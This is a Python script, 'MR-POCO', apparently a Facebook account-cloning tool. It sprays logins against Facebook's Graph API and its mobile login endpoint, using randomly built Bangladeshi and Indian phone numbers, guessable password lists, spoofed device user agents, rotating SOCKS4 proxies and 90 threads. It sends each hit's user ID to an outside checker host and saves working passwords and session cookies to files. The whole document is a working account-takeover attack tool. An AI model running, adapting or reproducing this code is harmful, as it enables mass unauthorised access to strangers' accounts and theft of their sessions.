#-----------------[ IMPORT ]-----------------#
import os,base64,zlib,pip,urllib,marshal,sys,requests,json,time,re,random,uuid,string,subprocess,bs4,datetime,urllib3,platform
from os import path
from concurrent.futures import ThreadPoolExecutor as tred
#-----------------[ LOOP ]-----------------#
user = [];oks = [];cps = [];twf = [];cpx = [];cokix = [];plist = [];loop = 0;land = []
#-----------------[ PROXY ]-----------------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('Proksi.txt','w').write(prox)
except Exception as e:
	print(e)
#-----------------[ SYS ]-----------------#
sys.stdout.write('\x1b]2; MR-POCO\x07')
#-----------------[ COLOR ]-----------------#
gx = '\x1b[1;32m';wx = '\x1b[1;97m';rx = '\x1b[38;5;160m';cx = '\x1b[1;96m';yx = '\x1b[1;93m';bx = '\x1b[1;90m'
#-----------------[ SYTLE ]-----------------#
xd = f'''{rx}>{wx}>{gx}''';xd1 = f'''{rx}>{wx}1{gx}''';xd2 = f'''{rx}>{wx}2{gx}''';xd3 = f'''{rx}>{wx}3{gx}''';xd0 = f'''{rx}>{wx}0{gx}''';xdx = f'''{rx}>{wx}?{gx}'''
#-----------------[ MODEL ]-----------------#
modelsXX = str(requests.get('https://raw.githubusercontent.com/TEAM-ELITE1/database/refs/heads/main/model.txt').text).splitlines()
#-----------------[ UA ]-----------------#
def uza():
    dalvik = f'''Dalvik/2.1.0 (Linux; U; Android {str(random.randint(4, 13))}; {str(random.choice(modelsXX))} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) '''
    return dalvik + '[FBAN/FB4A;FBAV/370.0.0.23.112;FBBV/374931232;FBDM/{density=1.875,width=720,height=1465};FBLC/ru_RU;FBCR/ALTEL 4G;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A037F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'

def uza2():
    fban = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';'
    return fban + '[FBAN/FB4A;FBAV/272.0.0.50.125;FBBV/216845518;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965U;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'

def uza3():
    fban = '[FBAN/FB4A;FBAV/' + str(random.randint(11, 99)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';'
    return fban + '[FBAN/FB4A;FBAV/272.0.0.50.125;FBBV/216845518;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/version 462.0.0.10.115;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'

def ____puck____():
    fuck1 = '[FBAN/FB4A;FBAV/373.0.0.31.112;FBBV/379975248;FBDM/{density=2.0,width=720,height=1384};FBLC/ru_RU;FBRV/381079118;FBCR/LMT;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J600FN;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    fuck2 = '[FBAN/FB4A;FBAV/453.0.0.40.107;FBBV/570632550;FBDM/{density=2.625,width=1080,height=2217};FBLC/ar_AR;FBRV/0;FBCR/Maroc Telecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A137F;FBSV/13;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    fuck3 = 'Dalvik/2.1.0 (Linux; U; Android 12; SM-A525F Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/439.0.0.29.119;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/548243065;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-A525F;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2186};FB_FW/1;]'
    fuck4 = 'Dalvik/2.1.0 (Linux; U; Android 12; SM-A235F Build/SP1A.210812.016) [FBAN/Orca-Android;FBAV/436.0.0.45.111;FBPN/com.facebook.orca;FBLC/fr_GN;FBBV/541554436;FBCR/Orange GN;FBMF/samsung;FBBD/samsung;FBDV/SM-A235F;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=2.8125,width=1080,height=2207};FB_FW/1;]'
    fuck5 = '[FBAN/FB4A;FBAV/123.0.0.44.555;FBBV/123456789;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/123456789;FBCR/Verizon ;FBMF/samsung;FBBD/Verizon;FBPN/com.facebook.katana;FBDV/SM-J737V;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    fuck6 = '[FBAN/FB4A;FBAV/453.0.0.40.107;FBBV/570632550;FBDM/{density=2.625,width=1080,height=2217};FBLC/ar_AR;FBRV/0;FBCR/Maroc Telecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A137F;FBSV/13;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    fuck7 = 'Dalvik/2.1.0 (Linux; U; Android 13; SM-A037U Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/423.0.0.25.113;FBPN/com.facebook.orca;FBLC/en_US;FBBV/507807851;FBCR/AT&amp;amp-T;FBMF/samsung;FBBD/samsung;FBDV/SM-A037U;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=1.75,width=720,height=1471};FB_FW/1;]'
    fuck8 = random.choice([fuck1,fuck2,fuck3,fuck4,fuck5,fuck6,fuck7])
    return fuck8

def ___porimoni___():
    mobile_version = f'''{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}'''
    mobile_model = random.choice(['CPH1869', 'CPH1929', 'CPH2107', 'CPH2238', 'CPH2389', 'CPH2401', 'CPH2407', 'CPH2413', 'CPH2415', 'CPH2417', 'CPH2419', 'CPH2455', 'CPH2459', 'CPH2461', 'CPH2471', 'CPH2473', 'CPH2477', 'CPH8893', 'CPH2321', 'CPH2341', 'CPH2373', 'CPH2083', 'CPH2071', 'CPH2077', 'CPH2185', 'CPH2179', 'CPH2269', 'CPH2421', 'CPH2349', 'CPH2271', 'CPH1923', 'CPH1925', 'CPH1837', 'CPH2015', 'CPH2073', 'CPH2081', 'CPH2029', 'CPH2031', 'CPH2137', 'CPH1605', 'CPH1803', 'CPH1853', 'CPH1805', 'CPH1809', 'CPH1851', 'CPH1931', 'CPH1959', 'CPH1933', 'CPH1935', 'CPH1943', 'CPH2061', 'CPH2069', 'CPH2127', 'CPH2131', 'CPH2139', 'CPH2135', 'CPH2239', 'CPH2195', 'CPH2273', 'CPH2325', 'CPH2309', 'CPH1701', 'CPH2387', 'CPH1909', 'CPH1920', 'CPH1912', 'CPH1901', 'CPH1903', 'CPH1905', 'CPH1717', 'CPH1801', 'CPH2067', 'CPH2099', 'CPH2161', 'CPH2219', 'CPH2197', 'CPH2263', 'CPH2375', 'CPH2339', 'CPH1715', 'CPH2385', 'CPH1729', 'CPH1827', 'CPH1938', 'CPH1937', 'CPH1939', 'CPH1941', 'CPH2001', 'CPH2021', 'CPH2059', 'CPH2121', 'CPH2123', 'CPH2203', 'CPH2333', 'CPH2365', 'CPH1913', 'CPH1911', 'CPH1915', 'CPH1969', 'CPH2209', 'CPH1987', 'CPH2095', 'CPH2119', 'CPH2285', 'CPH2213', 'CPH2223', 'CPH2363', 'CPH1609', 'CPH1613', 'CPH1723', 'CPH1727', 'CPH1725', 'CPH1819', 'CPH1821', 'CPH1825', 'CPH1881', 'CPH1823', 'CPH1871', 'CPH1875', 'CPH2023', 'CPH2005', 'CPH2025', 'CPH2207', 'CPH2173', 'CPH2307', 'CPH2305', 'CPH2337', 'CPH1955', 'CPH1707', 'CPH1719', 'CPH1721', 'CPH1835', 'CPH1831', 'CPH1833', 'CPH1879', 'CPH1893', 'CPH1877', 'CPH1607', 'CPH1611', 'CPH1917', 'CPH1919', 'CPH1907', 'CPH1989', 'CPH1945', 'CPH1951', 'CPH2043', 'CPH2035', 'CPH2037', 'CPH2036', 'CPH2009', 'CPH2013', 'CPH2113', 'CPH2091', 'CPH2125', 'CPH2109', 'CPH2089', 'CPH2065', 'CPH2159', 'CPH2145', 'CPH2205', 'CPH2201', 'CPH2199', 'CPH2217', 'CPH1921', 'CPH2211', 'CPH2235', 'CPH2251', 'CPH2249', 'CPH2247', 'CPH2237', 'CPH2371', 'CPH2293', 'CPH2353', 'CPH2343', 'CPH2359', 'CPH2357', 'CPH2457', 'CPH1983', 'CPH1979', 'oppo f 5 plus', 'OPPO F1', 'OPPO F1 Plus', 'PEPM00', 'PEDM00', 'PCHM10', 'PCLM10', 'PCCM00', 'PDBM00', 'OPPO PBBM30', 'OPPO A31', 'OPPO F1s', 'A31', 'OPPO R11s', 'OPPO A37m', 'OPPO 1105', 'oppo 15', 'oppo6779', 'oppo6833', 'OPPO7273', 'Oppo A1', 'PCHM10', 'CPH2071', 'CPH2185', 'CPH2179', 'CPH1861'])
    chrome = '{}.0.{}.{}'.format(random.randint(100, 123), random.randint(1111, 6500), random.randint(100, 400))
    ua = f'''Mozilla/5.0 (Linux; U; Android {mobile_version}; {mobile_model} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome} Mobile Safari/537.36 OPR/{str(random.randint(20, 50))}.{str(random.randint(0, 1))}.{str(random.randint(1000, 4999))}.{str(random.randint(70000, 209999))}|"Not:A-Brand";v="99", "Chromium";v="98"|11|98.0.4758.101'''
    return ua
#-----------------[ CLEAR ]-----------------#
def clear():os.system('clear');print(logo)
def linex():print(f'''{wx}{47*'-'}''')
#-----------------[ LOGO ]-----------------#
logo = f'''
            {gx}┏┳┓{wx}┏━┓{gx} ┏━┓┏━┓┏━╸┏━┓
            {gx}┃┃┃{wx}┣┳┛ {gx}┣━┛┃ ┃┃  ┃ ┃
            {gx}╹ ╹{wx}╹┗╸ {gx}╹  ┗━┛┗━╸┗━┛ {gx}1{wx}.{yx}4
{wx}{47*'-'}
{xd} OWNER {rx}:{gx} MR-POCO
{xd} TOOLS {rx}:{gx} RANDOM {rx}|{wx}BD{rx}|{wx}INDIA{rx}|{gx} CLONING
{wx}{47*'-'}'''
#-----------------[ COUNTRY ]-----------------#
country_map = {'1': 'BD (1)','2': 'BD (2)','3': 'INDIA' }
#-----------------[ MENU ]-----------------#
def poco():
    clear();print(f'''{xd1} BD ({wx}1{gx}) RANDOM CLONING ''');print(f'''{xd2} BD ({wx}2{gx}) RANDOM CLONING ''');print(f'''{xd3} INDIA RANDOM CLONING ''');print(f'''{xd0} EXIT CLONING ''');linex();option = input(f'''{xdx} SELECTION {rx}:{wx} ''')
    if option in country_map:land.append(option);___random_menu___(option)
    elif option in ('0',):exit(f'''{xd} EXIT DONE ''')
    else:linex();print(f'''{xd}{rx} OPTION NOT FOUND ''');time.sleep(3);linex();print(f'''{xd}{rx} PLEASE TRY AGAIN ''');time.sleep(3);poco()
#-----------------[ RANDOM MENU ]-----------------#
def ___random_menu___(option):
    clear()
    if '1' in land:print(f'''{xd} SIM CODE {rx}:{gx} 016 {rx}|{gx} 017 {rx}|{gx} 018 {rx}|{gx} 019 ''');linex()
    if '2' in land:print(f'''{xd} SIM CODE {rx}:{gx} 017 {rx}|{gx} 016 {rx}|{gx} 019 {rx}|{gx} 018 ''');linex()
    if '3' in land:print(f'''{xd} SIM CODE {rx}:{gx} +91639 {rx}|{gx} +91629 {rx}|{gx} +91610 ''');linex()
    code = input(f'''{xdx} ENTER SIM CODE {rx}:{wx} ''');linex();print(f'''{xd} CRACKE LIMIT {rx}:{gx} 3000 {rx}|{gx} 5000 {rx}|{gx} 10000 {rx}|{gx} 99999 ''');linex();limit = int(input(f'''{xdx} ENTER LIMIT  {rx}:{wx} '''));clear();print(f'''{xd1} METHOD M1 ''');print(f'''{xd2} METHOD M2 ''');linex();methodpro = input(f'''{xdx} ENTER METHOD {rx}:{wx} ''');clear();print(f'''{xd} CHECKPOINT ACCOUNT SHOW ({wx}y{rx}|{wx}n{gx}) ''');linex();checkpoint = input(f'''{xdx} ENTER y{rx}|{gx}n {rx}:{wx} ''')
    if checkpoint in ('n', 'N', 'no', 'NO', '2'):cpx.append('n')
    else:cpx.append('y')
    for nmbr in range(limit):
        if '1' in land:numberx = ''.join((random.choice(string.digits) for _ in range(8)));user.append(numberx)
        if '2' in land:xhude = ''.join((random.choice(string.digits) for _ in range(2)));xhudenaki = ''.join((random.choice(string.digits) for _ in range(2)));numberxx = ''.join((random.choice(string.digits) for _ in range(4)));user.append(numberxx)
        if '3' in land:numberxxx = ''.join((random.choice(string.digits) for _ in range(7)));user.append(numberxxx)
    with tred(max_workers=90) as ______mrpoco______:
        clear();tl = str(len(user));country_name = country_map.get(option, 'UNKNOWN')
        print(f'''{xd} CODE{rx}|{gx}LIMIT{rx}|{gx}COUNTRY {rx}:{wx} {code}{rx}|{wx}{tl}{rx}|{wx}{country_name} ''');print(f'''{xd} FLIGHT MODE {wx}ON{rx}|{wx}OFF{gx} EVERY {wx}3{gx} MINUTES ''');linex()
        for love in user:
            if '1' in land:ids = code + love
            if '2' in land:ids = code + xhude + xhudenaki + love
            if '3' in land:ids = code + love
            if '1' in land:passlist = [ids, love, ids[:6], ids[:7], ids[:8], ids[5:]]
            if '2' in land:passlist = [xhude + xhudenaki + code, xhudenaki + code, code + xhude + xhudenaki, code + code, code + '123', code + '1234', 'FREE FIRE', 'free fire', 'Bangladesh']
            if '3' in land:passlist = [ids, love, ids[:6], '57273200', '57575751', '59039200']
            if methodpro in ['1']:______mrpoco______.submit(____methodA____,ids,passlist,tl)
            elif methodpro in ['2']:______mrpoco______.submit(____methodB____,ids,passlist,tl)
    linex();print(f'''{xd} THE PROCESS HAS COMPLETED''');print(f'''{xd} TOTAL OK{rx}|{gx}CP {rx}:{gx} '''+str(len(oks))+f'''{rx}|{gx} '''+str(len(cps)));linex();sys.exit()
#-----------------[ METHOD A ]-----------------#
def ____methodA____(ids,passlist,tl):
    global loop
    sys.stdout.write(f'\r\x1b[38;5;160m>\x1b[1;97m>\x1b[1;32m POCO-M1 \x1b[38;5;160m>\x1b[1;97m> %s \x1b[38;5;160m>\x1b[1;97m>\x1b[1;32m %s \x1b[1;37m' % (loop, len(oks)));sys.stdout.flush()
    try:
        for pas in passlist:
        	accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
        	random_seed = random.Random()
        	mixmodelx = random.choice(['GT-1015', 'GT-1020', 'GT-1030', 'GT-1035', 'GT-1040', 'GT-1045', 'GT-1050', 'GT-1240', 'GT-1440', 'GT-1450', 'GT-18190', 'GT-18262', 'GT-19060I', 'GT-19082', 'GT-19083', 'GT-19105', 'GT-19152', 'GT-19192', 'GT-19300'])
        	____useragentAA____ = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4, 13)}; {str(mixmodelx)} Build/QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}) ' + '[FBAN/FB4A;FBAV/267.0.0.2.197;FBPN/com.facebook.katana;FBDM/{density=2.625,width=1080,height=1794};FBLC/en_US;FBBV/489728890;FBCR/null;FBMF/Clementoni;FBBD/Clementoni;FBDV/Clempad_7_S;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
        	data = {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'cpl': 'true','family_device_id': str(uuid.uuid4()),'credentials_type': 'device_based_login_password','error_detail_type': 'button_with_disabled','source': 'device_based_login','email': ids,'password': pas,'access_token': f'{accessToken}','generate_session_cookies': '1','advertiser_id': str(uuid.uuid4()),'currently_logged_in_userid': '0','locale': 'en_US','client_country_code': 'US','method': 'auth.login','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler','api_key': '882a8490361da98702bf97a021ddc14d'}
        	headers = {'User-Agent': uza(),'Accept-Encoding': 'gzip, deflate','Accept': '*/*','Connection': 'keep-alive','Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': '45204','X-FB-SIM-HNI': '45201','X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62','Content-Length': '702'}
        	url = 'https://graph.facebook.com/auth/login'
        	po = requests.post(url,data=data,headers=headers).json()
        	if 'session_key' in po:
        	    uid = po['uid']
        	    coki = ';'.join((i['name'] + '=' + i['value'] for i in po['session_cookies']))
        	    chek_url = str(requests.get(f'''https://mrpoco143.pythonanywhere.com/live?uid={uid}''').text)
        	    if 'LIVE' in chek_url:
        	        print('\r\x1b[38;5;160m>\x1b[1;97m>\x1b[1;32m POCO-OK '+str(uid)+' | '+pas+'\x1b[1;97m')
        	        print('\r\x1b[38;5;160m>\x1b[1;97m>\x1b[1;32m '+coki);linex()
        	        open('/sdcard/POCO-M1-RNDM-OK.txt', 'a').write(str(uid)+'|'+pas+'|'+coki+'\n')
        	        oks.append(str(uid))
        	        break
        	    else:continue
        	elif 'www.facebook.com' in po['error']['message']:
        	    uid = po['error']['error_data']['uid']
        	    if 'y' in checkpoint:print('\r\x1b[38;5;160m>\x1b[1;97m>\x1b[38;5;205m POCO-CP '+str(uid)+' | '+pas+'\x1b[1;97m')
        	    open('/sdcard/POCO-M1-RNDM-CP.txt', 'a').write(str(uid)+'|'+pas+'\n')
        	    cps.append(str(uid))
        	    break
        	else:continue
        loop += 1
    except Exception as e:
    	pass
#-----------------[ METHOD B ]-----------------#
def ____methodB____(ids,passlist,tl):
    global loop
    sys.stdout.write('\r\x1b[38;5;160m>\x1b[1;97m>\x1b[1;32m POCO-M2 \x1b[38;5;160m>\x1b[1;97m> %s \x1b[38;5;160m>\x1b[1;97m>\x1b[1;32m %s \x1b[1;37m' % (loop, len(oks)));sys.stdout.flush()
    ewe = requests.Session()
    ua = ___porimoni___()
    for pas in passlist:
    	try:
    	    xx = open('Proksi.txt', 'r').read().splitlines()
    	    zz = {'http': 'socks4://' + random.choice(xx)}
    	    link = ewe.get('https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
    	    data = {"m_ts": re.search('name="m_ts" value="(.*?)"', str(link)).group(1),"li": re.search('name="li" value="(.*?)"', str(link)).group(1),"try_number": 0,"unrecognized_tries": 0,"email": ids,"prefill_contact_point": ids,"prefill_source": "browser_dropdown","prefill_type": "contact_point","first_prefill_source": "browser_dropdown","first_prefill_type": "contact_point","had_cp_prefilled": True,"had_password_prefilled": False,"is_smart_lock": False,"bi_xrwh": 0,"encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),"bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',"jazoest": re.search("name=\"jazoest\" value=\"(\\d+)\"", str(link)).group(1),"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1)}
    	    headers = {"Host": "touch.facebook.com","content-length": str(len((data))),"sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="{}", "Google Chrome";v="{}"'.format(re.search(r'Chrome/(\d+)\.', str(ua)).group(1),re.search(r'Chrome/(\d+)\.', str(ua)).group(1)),"sec-ch-ua-mobile": "?1","user-agent": uza3(),"x-response-format": "JSONStream","content-type": "application/x-www-form-urlencoded","x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),"viewport-width": "360","x-requested-with": "XMLHttpRequest","x-asbd-id": "129477","dpr": "2","sec-ch-prefers-color-scheme": "light","sec-ch-ua-platform": '"Android"',"accept": "*/*","origin": "https://touch.facebook.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
    	    response = ewe.post("https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100", data=data, headers=headers, allow_redirects=False, proxies=zz)
    	    if "checkpoint" in ewe.cookies.get_dict():
    	        uid = ewe.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
    	        print('\r\x1b[38;5;160m>\x1b[1;97m>\x1b[38;5;205m POCO-CP '+str(uid)+' | '+pas+'\x1b[1;97m')
    	        open('/sdcard/POCO-M2-RNDM-CP.txt', 'a').write(str(uid)+'|'+pas+'\n')
    	        cps.append(str(uid))
    	        break
    	    elif "c_user" in ewe.cookies.get_dict():
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ewe.cookies.get_dict().items()])
                uid = re.findall('c_user=(.*);xs', kuki)[0]
                response = str(requests.get(f"https://mrpoco143.pythonanywhere.com/live?uid={uid}").text)
                if 'LIVE' in response:
                    print('\r\x1b[38;5;160m>\x1b[1;97m>\x1b[1;32m POCO-OK '+str(uid)+' | '+pas+'\x1b[1;97m')
                    print('\r\x1b[38;5;160m>\x1b[1;97m>\x1b[1;32m '+kuki);linex()
                    open('/sdcard/POCO-M2-RNDM-OK.txt', 'a').write(str(uid)+'|'+pas+'|'+kuki+'\n')
                    oks.append(str(uid))
                    break
                else:continue
    	except requests.exceptions.ConnectionError:time.sleep(15)
    loop +=1
#-----------------[ END ]-----------------#
if __name__ == "__main__":
	poco()